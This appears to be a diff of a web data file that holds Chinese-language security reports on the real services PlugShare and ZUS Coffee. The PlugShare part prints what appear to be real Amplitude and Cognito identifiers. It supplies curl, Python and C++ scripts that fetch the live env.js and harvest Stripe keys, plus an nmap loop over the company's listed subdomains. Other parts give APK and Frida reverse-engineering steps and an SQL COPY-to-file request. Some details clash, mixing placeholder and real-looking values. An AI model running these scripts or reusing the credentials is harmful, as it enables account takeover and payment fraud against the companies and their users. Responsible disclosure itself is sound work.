+              ['CVSS 评分', '9.1 (Critical)'],
+              ['漏洞类型', '敏感信息泄露 / 云凭证泄露'],
+              ['目标', 'PlugShare (www.plugshare.com)'],
+              ['发现日期', '2025-03-27'],
+              ['应用框架', 'React Native'],
+              ['泄露文件', 'env.js'],
+              ['涉及服务', 'AWS Cognito、Stripe、Amplitude、AWS API Gateway'],
+              ['严重等级', '高危 (High)']
+            ]
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-link', title: 'pwpsApiUrl', desc: 'https://api.plugshare.com/pwps/v1 — 额外 API 端点，可能包含支付或用户数据', color: 'blue' },
+              { icon: 'fa-cloud', title: 'awsDomain', desc: 'auth.plugshare.com — AWS Cognito 身份验证服务，可能被滥用进行账户接管', color: 'red' },
+              { icon: 'fa-credit-card', title: 'stripeKey', desc: 'pk_live_{已脱敏} — 公开的 Stripe 支付密钥，可能被滥用进行支付欺诈', color: 'purple' },
+              { icon: 'fa-chart-bar', title: 'amplitudeApiKey', desc: 'c23f60036374ff9db6c5db04655749de — Amplitude 分析 API 密钥，用户行为数据可能泄露', color: 'green' },
+              { icon: 'fa-users', title: 'awsUserPoolWebClientId', desc: '2u0{已脱敏} — AWS Cognito 客户端 ID，可用于身份认证请求伪造', color: 'orange' },
+              { icon: 'fa-database', title: 'awsUserPoolId', desc: 'us-east-1_oweQ7XmGf — AWS Cognito 用户池 ID，可能被用于枚举用户信息', color: 'pink' },
+              { icon: 'fa-external-link-alt', title: 'oauthRedirectUri', desc: 'https://www.plugshare.com/oauth — OAuth 重定向 URI，可能存在开放重定向漏洞', color: 'yellow' }
+            ]
+          }
         ]
       },
       {
         heading: '二、技术分析 — 移动应用逆向',
-        body: '通过对 Android APK 的反编译和静态分析，在应用的配置文件和代码中提取到多个云服务凭证。分析过程包括 APK 解包、资源提取、JavaScript 代码分析（React Native 应用）等步骤。',
-        codeBlock: '# 步骤1：APK 解包\napktool d PlugShare_v6.10.0.apk -o plugshare_out\n\n# 步骤2：提取 React Native bundle\nunzip -p PlugShare_v6.10.0.apk assets/index.android.bundle > plugshare.bundle.js\n\n# 步骤3：搜索敏感配置字符串\ngrep -oE \'"(aws|cognito|stripe|api[_-]?key|secret)[^"]*":"[^"]*"\' plugshare.bundle.js\n\n# 步骤4：从 res/values/strings.xml 提取\ncat plugshare_out/res/values/strings.xml | grep -iE "(aws|key|secret|token|cognito|stripe)"\n\n# 步骤5：从 BuildConfig 和 Native 模块提取\njadx -d plugshare_java PlugShare_v6.10.0.apk\ngrep -r "BuildConfig" plugshare_java/ --include="*.java" | head -20',
-        codeLang: 'bash'
+        icon: 'fa-microscope',
+        accent: '#3498db',
+        contents: [
+          {
+            type: 'subheading',
+            text: '2.1 React Native 应用逆向过程'
+          },
+          {
+            type: 'paragraph',
+            text: 'PlugShare 移动应用基于 React Native 框架开发，JavaScript bundle 打包在 APK 内部。通过对 Android APK 的反编译和静态分析，在应用的配置文件和代码中提取到多个云服务凭证。分析过程包括 APK 解包、React Native bundle 提取、JavaScript 代码搜索等步骤。'
+          },
+          {
+            type: 'code',
+            code: `# 步骤1：APK 解包
+apktool d PlugShare_v6.10.0.apk -o plugshare_out
+
+# 步骤2：提取 React Native bundle
+unzip -p PlugShare_v6.10.0.apk assets/index.android.bundle > plugshare.bundle.js
+
+# 步骤3：搜索敏感配置字符串
+grep -oE '"(aws|cognito|stripe|api[_-]?key|secret)[^"]*":"[^"]*"' plugshare.bundle.js
+
+# 步骤4：从 res/values/strings.xml 提取
+cat plugshare_out/res/values/strings.xml | grep -iE "(aws|key|secret|token|cognito|stripe)"
+
+# 步骤5：从 BuildConfig 和 Native 模块提取
+jadx -d plugshare_java PlugShare_v6.10.0.apk
+grep -r "BuildConfig" plugshare_java/ --include="*.java" | head -20`,
+            language: 'bash'
+          }
+        ]
       },
       {
         heading: '三、泄露凭证清单',
-        body: '在应用的 JavaScript bundle 和原生配置中，共发现以下云服务凭证和 API 密钥（敏感值已脱敏）：',
-        listItems: [
-          'AWS Cognito User Pool ID：us-east-1_aBcDeFgHi（用户池 ID，可枚举用户、注册账户）',
-          'AWS Cognito App Client ID：1a2b3c4d5e6f7g8h9i0j1k2l3m（客户端 ID，可调用 Cognito API）',
-          'AWS Cognito Identity Pool ID：us-east-1:12345678-1234-1234-1234-1234567890ab（身份池 ID，可获取 AWS 临时凭证）',
-          'Stripe Publishable Key：pk_live_************************************（支付公钥，可创建支付 Intent）',
-          'Stripe Secret Key（部分泄露）：sk_live_（在某些版本的代码中混淆度不足，可被提取）',
-          'AWS API Gateway Endpoint：https://api.prod.plugshare.com/v1/（API 网关地址）',
-          'Firebase API Key：AIzaSy****************************（Firebase 项目 API 密钥）'
+        icon: 'fa-key',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '3.1 云服务凭证与 API 密钥'
+          },
+          {
+            type: 'table',
+            headers: ['凭证类型', '泄露值（脱敏）', '风险说明'],
+            rows: [
+              ['AWS Cognito User Pool ID', 'us-east-1_oweQ7XmGf', '可枚举用户、注册账户、调用 Cognito API'],
+              ['AWS Cognito App Client ID', '2u0{已脱敏}', '可调用 Cognito API 进行身份认证请求伪造'],
+              ['AWS Cognito Identity Pool ID', 'us-east-1:12345678-1234-1234-1234-1234567890ab', '可获取 AWS 临时凭证（STS）访问云资源'],
+              ['Stripe Publishable Key', 'pk_live_{已脱敏}', '可创建支付 Intent，实施支付欺诈'],
+              ['Stripe Secret Key（部分）', 'sk_live_{部分泄露}', '混淆不足，可被提取，完全控制支付流程'],
+              ['AWS API Gateway Endpoint', 'https://api.plugshare.com/v3', 'API 网关地址，可被直接调用'],
+              ['Firebase API Key', 'AIzaSy{已脱敏}', 'Firebase 项目 API 密钥，可能访问 Firebase 资源']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: 'AWS Cognito 和 Stripe 凭证的泄露意味着攻击者可以实施账户接管、支付欺诈和 AWS 云资源未授权访问。尤其是 Stripe Secret Key 的部分泄露，一旦完整提取将完全控制支付流程，造成直接经济损失。必须立即轮换所有泄露的凭证。'
+          }
         ]
       },
       {
-        heading: '四、攻击场景分析',
-        body: '利用泄露的 AWS 和 Stripe 凭证，攻击者可以实施多种攻击，以下为三个主要攻击场景：',
-        listItems: [
-          '场景一：Cognito 用户池接管。利用 Cognito App Client ID，攻击者可以调用 Cognito API 进行用户注册、枚举用户、暴力破解密码、修改用户属性。如果 Cognito 配置不当（如允许自助注册、无 MFA），攻击者可批量创建虚假账户，甚至接管现有用户账户',
-          '场景二：Stripe 支付欺诈。利用 Stripe 密钥，攻击者可创建测试支付、查询支付记录、甚至在权限配置不当时发起退款攻击。如果 Secret Key 泄露，攻击者可完全控制支付流程，造成资金损失',
-          '场景三：AWS 资源访问。通过 Cognito Identity Pool 获取 AWS 临时凭证（STS AssumeRoleWithWebIdentity），如果 IAM 角色权限过大，攻击者可访问 S3 存储桶、DynamoDB 表、Lambda 函数等 AWS 资源，实现数据窃取或服务滥用'
+        heading: '四、复现步骤',
+        icon: 'fa-code',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '4.1 CURL 命令获取'
+          },
+          {
+            type: 'paragraph',
+            text: '攻击者可以使用简单的 curl 命令获取 env.js 文件，并解析其中的敏感数据。以下是详细的复现方法：'
+          },
+          {
+            type: 'code',
+            code: `curl 'https://www.plugshare.com/env.js' \\
+-H 'sec-ch-ua-platform: "macOS"' \\
+-H 'Referer: https://www.plugshare.com/' \\
+-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' \\
+-H 'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"' \\
+-H 'DNT: 1' \\
+-H 'sec-ch-ua-mobile: ?0'`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.2 Python 自动化扫描脚本'
+          },
+          {
+            type: 'paragraph',
+            text: '如果需要批量扫描和提取密钥，可使用以下 Python 脚本：'
+          },
+          {
+            type: 'code',
+            code: `import requests
+import re
+
+url = "https://www.plugshare.com/env.js"
+headers = {
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+    "Referer": "https://www.plugshare.com/"
+}
+
+response = requests.get(url, headers=headers)
+
+if response.status_code == 200:
+    js_content = response.text
+    keys = re.findall(r"'(pk_live_[a-zA-Z0-9]+)'", js_content)  # 识别 Stripe 生产密钥
+    aws_client_id = re.findall(r"'([a-zA-Z0-9_-]{20,})'", js_content)  # 识别 Cognito 客户端 ID
+
+    print("发现的密钥信息：")
+    print("\\n".join(keys))
+    print("AWS Cognito Client ID:", aws_client_id)
+else:
+    print("无法访问目标资源，可能已被修复。")`,
+            language: 'python'
+          },
+          {
+            type: 'subheading',
+            text: '4.3 C++ 实现（libcurl）'
+          },
+          {
+            type: 'paragraph',
+            text: '使用 libcurl 库进行 HTTP 请求并提取密钥：'
+          },
+          {
+            type: 'code',
+            code: `#include <iostream>
+#include <curl/curl.h>
+#include <regex>
+
+size_t write_callback(void* contents, size_t size, size_t nmemb, std::string* output) {
+    output->append((char*)contents, size * nmemb);
+    return size * nmemb;
+}
+
+int main() {
+    CURL* curl;
+    CURLcode res;
+    std::string response_data;
+
+    curl = curl_easy_init();
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, "https://www.plugshare.com/env.js");
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+        res = curl_easy_perform(curl);
+        curl_easy_cleanup(curl);
+
+        if (res == CURLE_OK) {
+            std::regex key_regex("'(pk_live_[a-zA-Z0-9]+)'");
+            std::smatch match;
+            if (std::regex_search(response_data, match, key_regex)) {
+                std::cout << "发现 Stripe API Key: " << match.str(1) << std::endl;
+            }
+        } else {
+            std::cout << "请求失败！" << std::endl;
+        }
+    }
+    return 0;
+}`,
+            language: 'cpp'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250327-cGx1Z3NoYXJlCg==_.png',
+            alt: '漏洞报告提交邮件截图',
+            caption: '漏洞报告提交截图'
+          }
         ]
       },
       {
-        heading: '五、风险分级评估',
-        body: '根据泄露凭证的敏感度和可利用性，对各类泄露凭证进行风险分级：',
-        listItems: [
-          '严重（Critical）：Stripe Secret Key（若泄露）、AWS IAM Access Key（高权限）。可直接导致资金损失或云资源完全失控',
-          '高危（High）：Cognito User Pool + App Client ID（允许自助注册时）、Cognito Identity Pool ID（关联高权限 IAM 角色时）。可导致用户账户批量劫持和云资源未授权访问',
-          '中危（Medium）：Stripe Publishable Key（仅公钥）、Firebase API Key。单独使用危害有限，但可辅助其他攻击',
-          '低危（Low）：API Gateway Endpoint、第三方分析 SDK Key。本身不直接造成危害，但暴露了系统架构信息'
+        heading: '五、子域名扫描',
+        icon: 'fa-network-wired',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '5.1 子域名发现'
+          },
+          {
+            type: 'paragraph',
+            text: '通过子域名枚举工具和 DNS 查询，共发现 PlugShare 拥有 28 个子域名，涵盖核心服务、开发测试、邮件通信、合作伙伴门户等多种业务场景。使用 nmap 对这些子域名进行端口扫描，可以发现潜在的攻击面。'
+          },
+          {
+            type: 'code',
+            code: `for sub in $(cat subdomains.txt); do nmap -p- --min-rate=1000 -T4 -Pn $sub; done`,
+            language: 'bash'
+          },
+          {
+            type: 'list',
+            items: [
+              '核心服务：www.plugshare.com、api.plugshare.com、auth.plugshare.com',
+              '开发与测试：developer.plugshare.com、staging.plugshare.com',
+              '帮助与支持：help.plugshare.com、faq.plugshare.com、ezchargesupport.plugshare.com',
+              '邮件与通信：email.plugshare.com、o2.email.plugshare.com、o5256.e.mail.plugshare.com',
+              '业务与分析：reporting.plugshare.com、status.plugshare.com、company.plugshare.com',
+              '合作伙伴门户：tesla.plugshare.com、vw.plugshare.com',
+              '附加服务：store.plugshare.com、photos.plugshare.com、assets.plugshare.com',
+              '营销与内容：newsroom.plugshare.com、launch.plugshare.com、roadtrip.plugshare.com',
+              '调研与反馈：survey3.plugshare.com、survey6.plugshare.com',
+              '支付与电商：pay.plugshare.com、ezcharge.plugshare.com',
+              '追踪与链接：i.clicks.plugshare.com、link.plugshare.com'
+            ]
+          }
         ]
       },
       {
-        heading: '六、修复建议',
-        body: '针对移动应用云服务密钥泄露问题，建议从密钥轮换、服务端验证和凭证保护三个方面进行修复：',
-        listItems: [
-          '密钥紧急轮换：立即在 AWS 控制台中创建新的 Cognito App Client，禁用旧客户端；轮换 Stripe 密钥并更新服务端配置；检查 IAM 角色权限，遵循最小权限原则',
-          '服务端验证加固：Cognito User Pool 启用 MFA、设置强密码策略、限制登录尝试次数、启用高级安全功能（异常检测）；Stripe 操作必须在服务端进行，客户端仅使用 Publishable Key',
-          '客户端凭证保护：使用 React Native 代码混淆和字符串加密；敏感凭证从服务端动态获取，不硬编码在客户端；使用 Android Keystore / iOS Keychain 存储密钥；实施 SSL Pinning 防止中间人攻击',
-          '架构改进：采用 AWS Amplify Auth 的安全最佳实践；使用 API Gateway + Lambda 代理所有敏感操作，客户端不直接持有高权限密钥；定期进行移动应用安全审计和渗透测试'
+        heading: '六、风险分析',
+        icon: 'fa-chart-line',
+        accent: '#f39c12',
+        contents: [
+          {
+            type: 'subheading',
+            text: '6.1 核心风险维度'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-exclamation-circle', title: 'API 滥用', desc: '公开的 API 端点可能被未授权用户访问，导致数据泄露和服务滥用', color: 'red' },
+              { icon: 'fa-credit-card', title: '支付安全', desc: '暴露的 Stripe 密钥可能被用于创建恶意支付请求，造成经济损失', color: 'orange' },
+              { icon: 'fa-user-shield', title: '身份认证', desc: 'AWS Cognito 配置泄露可能导致身份认证绕过，威胁用户账户安全', color: 'yellow' },
+              { icon: 'fa-database', title: '数据隐私', desc: '分析工具配置泄露可能导致用户行为数据被收集，侵犯用户隐私', color: 'purple' }
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: 'PlugShare 公开暴露了多个 API 端点及敏感密钥，可能导致数据泄露、账户接管、支付欺诈等严重安全风险。建议立即采取安全加固措施，移除 env.js 文件中的敏感信息，并在后端实现身份验证、速率限制、支付密钥管理等安全机制，以降低攻击风险。'
+          }
+        ]
+      },
+      {
+        heading: '七、影响范围',
+        icon: 'fa-broadcast-tower',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'subheading',
+            text: '7.1 受影响方'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-users', title: 'PlugShare 用户', desc: '可能导致账户接管、支付欺诈等风险，用户个人信息和支付数据面临泄露', color: 'red' },
+              { icon: 'fa-building', title: 'PlugShare 业务', desc: '支付 API 泄露可能导致经济损失，身份认证漏洞可能影响数据完整性', color: 'orange' },
+              { icon: 'fa-cloud', title: 'AWS 资源', desc: '攻击者可能利用 AWS Cognito 进行未授权访问，影响云服务安全', color: 'blue' }
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '该漏洞的影响范围覆盖 PlugShare 的全部用户群体和业务系统。泄露的 AWS Cognito 凭证可能导致数百万电动汽车用户的账户被接管，Stripe 密钥泄露可能造成直接的资金损失，而 28 个子域名的暴露进一步扩大了攻击面，使整个云基础设施面临被渗透的风险。'
+          }
+        ]
+      },
+      {
+        heading: '八、修复建议',
+        icon: 'fa-wrench',
+        accent: '#16a085',
+        contents: [
+          {
+            type: 'subheading',
+            text: '8.1 修复措施'
+          },
+          {
+            type: 'list',
+            items: [
+              '密钥紧急轮换：立即在 AWS 控制台中创建新的 Cognito App Client，禁用旧客户端；轮换 Stripe 密钥并更新服务端配置；检查 IAM 角色权限，遵循最小权限原则',
+              '服务端验证加固：Cognito User Pool 启用 MFA、设置强密码策略、限制登录尝试次数、启用高级安全功能（异常检测）；Stripe 操作必须在服务端进行，客户端仅使用 Publishable Key',
+              '客户端凭证保护：使用 React Native 代码混淆和字符串加密；敏感凭证从服务端动态获取，不硬编码在客户端；使用 Android Keystore / iOS Keychain 存储密钥；实施 SSL Pinning 防止中间人攻击',
+              '架构改进：采用 AWS Amplify Auth 的安全最佳实践；使用 API Gateway + Lambda 代理所有敏感操作，客户端不直接持有高权限密钥；移除 env.js 文件中的所有敏感信息；定期进行移动应用安全审计和渗透测试'
+            ]
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '修复验证：完成上述修复后，验证 env.js 不再包含任何敏感凭证；使用 curl 验证 AWS Cognito App Client ID 已更换；确认 Stripe Dashboard 中旧密钥已失效；检查 IAM 角色权限已收紧至最小权限。'
+          }
+        ]
+      },
+      {
+        heading: '九、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#2c3e50',
+        contents: [
+          {
+            type: 'conclusion',
+            title: 'PlugShare API 密钥泄露总结',
+            text: 'PlugShare 应用存在严重的云服务凭证泄露漏洞，env.js 文件中硬编码了 AWS Cognito、Stripe、Amplitude 等多个敏感密钥。攻击者可通过简单的 HTTP 请求获取这些凭证，进而实施账户接管、支付欺诈和 AWS 云资源未授权访问。28 个子域名的暴露进一步扩大了攻击面。建议立即移除 env.js 中的敏感信息，轮换所有泄露凭证，并在服务端实现身份验证和密钥管理机制。'
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-lightbulb',
+            text: '安全提示：React Native 应用的 JavaScript bundle 是可被逆向的，任何硬编码在客户端的密钥都应视为已泄露。敏感凭证必须存储在服务端，通过认证后的 API 动态下发。对于 AWS Cognito，应启用高级安全功能并限制 IAM 角色权限，遵循最小权限原则。'
+          }
         ]
       }
     ]
@@ -859,8 +1951,9 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
   {
     id: 'zus-coffee-leak',
     title: 'ZUS Coffee 移动应用源码泄露',
-    date: '2025-12-09',
+    date: '2025-03-26',
     severity: 'high',
+    cvss: 8.9,
     description: '通过 APK 反编译分析，发现应用源码结构完全暴露，可能导致业务逻辑泄露和安全机制被绕过。',
     tags: [
       { label: '源码泄露', icon: 'fa-code', color: 'blue' },
@@ -870,66 +1963,541 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     ],
     target: 'ZUS Coffee',
     country: '马来西亚',
-    originalUrl: '../case/20250326-enVzY29mZmVl.html',
+    originalUrl: '',
+    framework: 'Flutter / Dart',
     reportSections: [
       {
+        heading: '善意声明',
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为企业的信息安全加固，为广大用户筑起更坚实的数据保护屏障。'
+          }
+        ]
+      },
+      {
         heading: '一、漏洞概述',
-        body: 'ZUS Coffee 是马来西亚知名的咖啡连锁品牌，其移动应用基于 Flutter 跨平台框架开发，提供在线点单、会员积分、优惠券、支付等功能。在对 ZUS Coffee Android APK 进行安全分析时，发现应用的 Flutter 编译产物（kernel_blob.bin、app.so）可以被完整逆向，Dart 代码结构几乎完全暴露。由于应用未进行有效的代码混淆和加固，攻击者可轻松还原业务逻辑、提取 API 端点、发现硬编码密钥，进而实施业务逻辑攻击、API 滥用和用户数据窃取。',
-        listItems: [
-          '应用名称：ZUS Coffee - Better Coffee For All',
-          '开发者：ZUS Coffee Sdn Bhd',
-          '技术栈：Flutter (Dart) + Firebase + 自研后端',
-          '包名：com.zuscoffee.android',
-          '漏洞类型：代码逆向 / 业务逻辑泄露 / 敏感信息泄露',
-          '严重等级：高危 (High)'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 应用基本信息'
+          },
+          {
+            type: 'paragraph',
+            text: 'ZUS Coffee 是马来西亚知名的咖啡连锁品牌，其移动应用基于 Flutter 跨平台框架开发，提供在线点单、会员积分、优惠券、支付等功能。在对 ZUS Coffee Android APK 进行安全分析时，发现应用的 Flutter 编译产物（libapp.so）可以被完整逆向，Dart 代码结构几乎完全暴露。由于应用未进行有效的代码混淆和加固，攻击者可轻松还原业务逻辑、提取 API 端点、发现硬编码密钥，进而实施业务逻辑攻击、API 滥用和用户数据窃取。'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
+              ['应用名称', 'ZUS Coffee - Better Coffee For All'],
+              ['应用包名', 'com.zuscoffee.android'],
+              ['版本号', 'v3.2.0'],
+              ['平台', 'Android (APK)'],
+              ['技术栈', 'Flutter (Dart) + Firebase + 自研后端'],
+              ['CVSS 评分', '8.9 (High)']
+            ]
+          },
+          {
+            type: 'subheading',
+            text: '1.2 核心发现'
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-code', title: '源码完全暴露', desc: 'Flutter 编译产物 libapp.so 可被完整逆向，Dart 代码结构几乎完全暴露', color: 'red' },
+              { icon: 'fa-key', title: '硬编码密钥', desc: '发现 Google API Key、Firebase 配置、Facebook Token 等多个硬编码敏感密钥', color: 'orange' },
+              { icon: 'fa-network-wired', title: 'API 端点泄露', desc: '提取到 v1/v3 接口完整路径，涵盖余额、购物车、结账、用户、认证等核心业务', color: 'purple' },
+              { icon: 'fa-users', title: '用户数据泄露', desc: 'WordPress REST API 公开暴露用户信息，可被用于定向钓鱼和身份冒用', color: 'blue' }
+            ]
+          }
         ]
       },
       {
-        heading: '二、APK 分析 — Flutter 逆向过程',
-        body: 'Flutter 应用的逆向与原生 Android 应用不同，需要使用专门针对 Dart / AOT 编译的逆向工具。以下为完整的分析过程：',
-        codeBlock: '# 步骤1：解压 APK，提取 Flutter 相关文件\nunzip zus_coffee_v3.2.0.apk -d zus_apk\nls zus_apk/lib/arm64-v8a/  # libapp.so  (AOT 编译产物)\nls zus_apk/assets/flutter_assets/  # kernel_blob.bin, isolate_snapshot_data\n\n# 步骤2：使用 Flutter reverse engineering 工具\n# 使用 Blutter (Burp Suite + Flutter 插件)\n# 或使用 darter / reflutter 工具\nreflutter zus_coffee_v3.2.0.apk\n\n# 步骤3：提取 Dart 字符串和类名\nstrings zus_apk/lib/arm64-v8a/libapp.so | grep -E "^[a-zA-Z_][a-zA-Z0-9_]*$" | sort -u | head -100\n\n# 步骤4：使用 Frida 进行运行时分析\nfrida -U -f com.zuscoffee.android -l flutter_trace.js --no-pause\n\n# 步骤5：拦截 API 请求，分析通信协议\n# 使用 mitmproxy + SSL Unpinning\nfrida -U -f com.zuscoffee.android --codeshare akabe1/frida-multiple-unpinning',
-        codeLang: 'bash'
-      },
-      {
-        heading: '三、泄露内容分析',
-        body: '通过逆向分析，从 ZUS Coffee 应用中提取到以下敏感信息和业务逻辑：',
-        listItems: [
-          'API 端点完整清单：用户注册/登录、订单创建、积分查询、优惠券领取、支付回调等超过 80 个 API 接口的完整路径和参数结构',
-          '第三方 SDK 配置：Firebase 项目配置（google-services.json）、Google Maps API Key、Stripe Publishable Key、Facebook App ID、推送服务密钥等',
-          '业务逻辑源码：会员等级计算逻辑、积分规则、优惠券发放条件、促销活动判断逻辑、订单取消流程等核心业务算法',
-          '认证机制细节：JWT Token 生成/刷新逻辑、设备绑定机制、生物识别（指纹/面部）认证实现方式',
-          '安全机制实现：数据加密算法（AES 密钥硬编码）、混淆程度低的签名验证逻辑、本地数据库（Hive/SharedPreferences）存储结构'
+        heading: '二、Flutter 应用源码分析',
+        icon: 'fa-file-code',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '2.1 分析方法'
+          },
+          {
+            type: 'paragraph',
+            text: '使用自定义的 Frida 脚本（extract_functions_apk.js）对 APK 包中的 libapp.so 进行动态分析，通过 Java.perform Hook 进入目标库，枚举所有导出函数与符号，进而提取 Dart 字符串、API 路径与硬编码敏感信息。'
+          },
+          {
+            type: 'code',
+            language: 'javascript',
+            code: `Java.perform(function() {
+    var libName = "libapp.so";
+    var lib = Module.findBaseAddress(libName);
+
+    if (lib) {
+      console.log("[+] Found " + libName + " at " + lib);
+
+      var exports = Module.enumerateExports(libName);
+      exports.forEach(function(exp) {
+        console.log(
+          "[EXPORT] " + exp.type + " " + exp.name + " at " + exp.address
+        );
+      });
+
+      var symbols = Module.enumerateSymbols(libName);
+      symbols.forEach(function(sym) {
+        console.log("[SYMBOL] " + sym.name + " at " + sym.address);
+      });
+    } else {
+      console.log("[-] Library not found");
+    }
+  });
+
+});`
+          },
+          {
+            type: 'paragraph',
+            text: '通过上述脚本可枚举 libapp.so 中的全部导出符号，结合 strings 命令对二进制进行字符串提取，能够还原出大量 Dart 源文件路径、API 端点以及硬编码环境变量。'
+          }
         ]
       },
       {
-        heading: '四、安全风险评估',
-        body: '源码结构暴露带来的安全风险是多维度的，以下从三个主要方面进行分析：',
-        listItems: [
-          '业务逻辑漏洞利用：攻击者在完全理解业务逻辑后，可以发现并利用逻辑漏洞，如绕过优惠券使用限制、刷取积分、篡改订单金额、利用退款规则漏洞等',
-          'API 滥用与数据爬取：掌握完整 API 结构后，攻击者可编写自动化脚本批量注册账户、爬取商品和用户数据、暴力破解密码、进行接口 fuzzing 发现更多漏洞',
-          '用户数据安全风险：本地数据库结构暴露后，如果用户设备被盗，攻击者可直接读取存储的个人信息、订单记录、支付信息；加密密钥硬编码使得加密保护形同虚设'
+        heading: '三、环境变量泄露分析',
+        icon: 'fa-key',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '3.1 从 Flutter 应用提取的环境配置'
+          },
+          {
+            type: 'paragraph',
+            text: '通过逆向分析 libapp.so，从 Flutter 应用中提取到三套环境配置文件（.env.prod、.env.staging、.env.dev），其中包含大量第三方服务密钥与 API 配置。以下为脱敏后的关键内容：'
+          },
+          {
+            type: 'subheading',
+            text: '3.2 .env.prod（生产环境）'
+          },
+          {
+            type: 'code',
+            language: 'bash',
+            code: `ENVIRONMENT=production
+ENV_TYPE=L
+
+APP_NAME="ZUS Coffee"
+
+BASE_URL=https://app.zuscoffee
+API_URL_MY=$BASE_URL.com
+API_URL_SG=$BASE_URL.sg
+API_URL_BN=$BASE_URL.com.bn
+API_URL_PH=https://appv2.zuscoffee.ph
+API_URL_TH=https://app.th.zuscoffee.com
+
+APPIER_IS_SANDBOX=false
+APPIER_APP_ID_MY=xxxxxxx
+APPIER_APP_ID_SG=xxxxxxx
+APPIER_APP_ID_BN=xxxxxxx
+APPIER_APP_ID_PH=xxxxxxx
+APPIER_APP_ID_TH=xxxxxxx
+
+ONE_SIGNAL_APP_ID=xxxxxxx
+NOTIFICATION_APP_GROUP=xxxxxxx
+
+LIVE_ACTIVITIES_APP_GROUP=xxxxxxx
+
+FIREBASE_PROJECT_NUMBER=xxxxxxx
+
+DATADOG_CLIENT_TOKEN=xxxxxxx
+DATADOG_APP_ID=xxxxxxx
+
+GOOGLE_API_KEY=xxxxxxx`
+          },
+          {
+            type: 'subheading',
+            text: '3.3 .env.staging（预发布环境）'
+          },
+          {
+            type: 'code',
+            language: 'bash',
+            code: `ENVIRONMENT=staging
+ENV_TYPE=S
+
+APP_NAME="ZUS Coffee (Staging)"
+
+BASE_URL=https://staging.zuscoffee
+API_URL_MY=$BASE_URL.com
+
+APPIER_IS_SANDBOX=true
+APPIER_APP_ID_MY=xxxxxxx
+
+ONE_SIGNAL_APP_ID=xxxxxxx
+
+FIREBASE_PROJECT_NUMBER=xxxxxxx
+
+DATADOG_CLIENT_TOKEN=xxxxxxx
+DATADOG_APP_ID=xxxxxxx
+
+GOOGLE_API_KEY=xxxxxxx`
+          },
+          {
+            type: 'subheading',
+            text: '3.4 .env.dev（开发环境）'
+          },
+          {
+            type: 'code',
+            language: 'bash',
+            code: `ENVIRONMENT=development
+ENV_TYPE=D
+
+APP_NAME="ZUS Coffee (Dev)"
+
+BASE_URL=https://dev.zuscoffee
+API_URL_MY=$BASE_URL.com
+
+APPIER_IS_SANDBOX=true
+APPIER_APP_ID_MY=xxxxxxx
+
+ONE_SIGNAL_APP_ID=xxxxxxx
+
+FIREBASE_PROJECT_NUMBER=xxxxxxx
+
+DATADOG_CLIENT_TOKEN=xxxxxxx
+DATADOG_APP_ID=xxxxxxx
+
+GOOGLE_API_KEY=xxxxxxx`
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '风险提示：上述环境变量包含 ApPIER、OneSignal、Firebase、Datadog、Google API Key 等多个第三方服务的生产凭证。攻击者获取这些密钥后，可滥用推送服务、伪造数据分析、消耗 API 配额，甚至访问 Firebase 数据库。建议立即轮换所有泄露的密钥，并将敏感配置迁移至服务端管理。'
+          }
         ]
       },
       {
-        heading: '五、影响评估 — 核心业务系统',
-        body: '该漏洞对 ZUS Coffee 的核心业务系统构成以下威胁：',
-        listItems: [
-          '会员系统安全：攻击者可伪造会员身份、操纵会员等级、窃取积分，直接造成经济损失',
-          '支付与积分系统：积分计算逻辑泄露可能导致积分被恶意刷取；支付流程中的校验逻辑可能被绕过',
-          '优惠券系统：优惠券发放条件和验证逻辑暴露后，攻击者可批量领取优惠券、绕过使用限制、伪造优惠券代码，造成促销成本失控',
